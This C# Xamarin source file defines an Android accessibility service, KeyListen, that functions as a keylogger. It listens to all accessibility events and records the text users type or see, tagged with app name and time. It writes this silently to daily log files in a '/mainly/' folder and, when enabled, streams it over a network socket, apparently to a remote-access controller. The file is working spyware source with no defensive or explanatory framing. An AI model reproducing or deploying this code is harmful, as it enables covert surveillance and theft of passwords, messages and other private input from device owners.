using Android;
using Android.AccessibilityServices;
using Android.App;
using Android.Content;
using Android.Views.Accessibility;
using System;
using System.IO;
using System.Net.Sockets;

namespace Task2
{
    [Service(Label = "@string/app_name", Permission = Manifest.Permission.BindAccessibilityService)]
    [IntentFilter(new[] { "android.accessibilityservice.AccessibilityService" })]
    public class KeyListen : AccessibilityService
    {
        protected override void OnServiceConnected()
        {
            try
            {               
                var accessibilityServiceInfo = ServiceInfo;
                accessibilityServiceInfo.EventTypes = EventTypes.AllMask;

                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.IncludeNotImportantViews;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.RequestFilterKeyEvents;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.ReportViewIds;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.RequestTouchExplorationMode;


                accessibilityServiceInfo.FeedbackType = FeedbackFlags.AllMask;
                accessibilityServiceInfo.NotificationTimeout = 1;

                SetServiceInfo(accessibilityServiceInfo);
            }
            catch (Exception) { }
            base.OnServiceConnected();
        }
        string tempus = "";
        private string paketIsmi(AccessibilityEvent ivent)
        {
            if (ivent.PackageName != tempus)
            {
                tempus = ivent.PackageName;
                return "[" + DateTime.Now.ToString("HH:mm") + "] " + ivent.PackageName + "[NEW_LINE]";
            }
            return "";
        }      
        public override void OnAccessibilityEvent(AccessibilityEvent e)
        {
            string dataFiles = Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" +
               string.Format("{0}-{1}-{2}", DateTime.Now.Day, DateTime.Now.Month, DateTime.Now.Year) + ".tht";

            try
            {
                string cr = paketIsmi(e) + e.Text[0];              
                if (ForegroundService.key_gonder == true)
                {
                    try
                    {
                        byte[] dataPacker = ForegroundService._globalService.MyDataPacker("CHAR", System.Text.Encoding.UTF8.GetBytes(cr.Replace(Environment.NewLine, "[NEW_LINE]")));
                        ForegroundService.Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
                using (StreamWriter sw = File.AppendText(dataFiles))
                {
                    sw.WriteLine(cr);
                }
            }
            catch (Exception) { }
        }
        public override void OnInterrupt() { }
    }
}